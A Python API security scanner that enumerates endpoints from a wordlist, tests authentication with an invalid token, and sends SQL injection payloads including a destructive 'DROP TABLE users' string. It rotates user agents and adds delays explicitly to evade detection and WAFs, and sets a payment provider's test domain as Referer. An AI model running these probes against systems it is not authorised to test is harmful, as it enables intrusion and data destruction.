import requests
import random
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

def banner():
    print(r"""
  _   _                   __ _            
 | \ | |                 / _| |           
 |  \| | ___  ___  _ __ | |_| |_   ___  __
 | . ` |/ _ \/ _ \| '_ \|  _| | | | \ \/ /
 | |\  |  __/ (_) | | | | | | | |_| |>  < 
 |_| \_|\___|\___/|_| |_|_| |_|\__,_/_/\_\
                                          
                                          
          NeonFlux API Tester            
            Author: saladb0y               
    """)

def log_results(test_name, result):
    """Logs results to a file for future reference."""
    with open("neonflux_results.log", "a") as log_file:
        log_file.write(f"{test_name} - {result}\n")

def get_headers():
    """Returns realistic headers to evade detection."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": "https://test.zaincash.iq",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }

def add_delay():
    """Adds a random delay between requests."""
    delay = random.uniform(1, 3)
    print(f"[INFO] Adding delay of {delay:.2f} seconds to evade WAF...")
    time.sleep(delay)

def discover_endpoints(base_url, wordlist):
    print("\n[!] Discovering Endpoints...")
    discovered = []
    try:
        with open(wordlist, "r") as f:
            paths = [line.strip() for line in f.readlines()]
        
        for path in paths:
            url = urljoin(base_url, path)
            try:
                print(f"[INFO] Checking: {url}")
                response = requests.head(url, timeout=3, headers=get_headers(), allow_redirects=True)
                if response.status_code < 400:
                    print(f"[FOUND] {url} ({response.status_code})")
                    discovered.append(path)
                add_delay()
            except requests.exceptions.RequestException as e:
                print(f"[WARNING] Skipped {url} due to error: {e}")
    except FileNotFoundError:
        print("[ERROR] Wordlist file not found.")
    return discovered

def test_authentication(base_url, endpoint):
    print("\n[1] Testing Authentication Enforcement...")
    try:
        url = urljoin(base_url, endpoint)
        print(f"[INFO] Sending authentication bypass request to: {url}")
        response = requests.get(url, headers={"Authorization": "Bearer invalid-token", **get_headers()})
        if response.status_code == 401:
            result = "[PASS] Authentication is enforced."
        else:
            result = f"[FAIL] Authentication bypassed! Response code: {response.status_code}"
        print(result)
        log_results("Authentication Enforcement", result)
        add_delay()
    except Exception as e:
        print(f"[ERROR] Authentication test failed: {e}")

def test_sql_injection(base_url, endpoint):
    print("\n[2] Testing SQL Injection...")
    try:
        payloads = ["1' OR '1'='1", "'; DROP TABLE users;--", "' UNION SELECT null, null, null--"]
        for payload in payloads:
            url = urljoin(base_url, f"{endpoint}/{payload}")
            print(f"[INFO] Testing SQL injection with payload: {payload}")
            response = requests.get(url, headers=get_headers())
            if "error" in response.text.lower() or response.status_code == 500:
                result = f"[FAIL] Potential SQL injection detected with payload: {payload}"
                print(result)
                log_results("SQL Injection", result)
                return
            add_delay()
        print("[PASS] No SQL injection vulnerability detected.")
        log_results("SQL Injection", "[PASS] No SQL injection vulnerability detected.")
    except Exception as e:
        print(f"[ERROR] SQL injection test failed: {e}")

def main():
    banner()
    base_url = input("Enter the base URL of the API (e.g., https://api.example.com): ").strip("/")
    wordlist_path = input("Enter the path to your wordlist for endpoint discovery (leave blank to skip): ").strip()
    
    endpoints = []
    if wordlist_path:
        endpoints = discover_endpoints(base_url, wordlist_path)
    else:
        print("\nEnter the endpoints to test (comma-separated). For example: /auth/login,/user/{id},/public_endpoint")
        endpoints = input("Endpoints: ").split(',')

    for endpoint in endpoints:
        endpoint = endpoint.strip("/")
        test_authentication(base_url, endpoint)
        test_sql_injection(base_url, endpoint)

    print("\nTesting complete. Results saved in 'neonflux_results.log'. Always report vulnerabilities responsibly.")

if __name__ == "__main__":
    main()
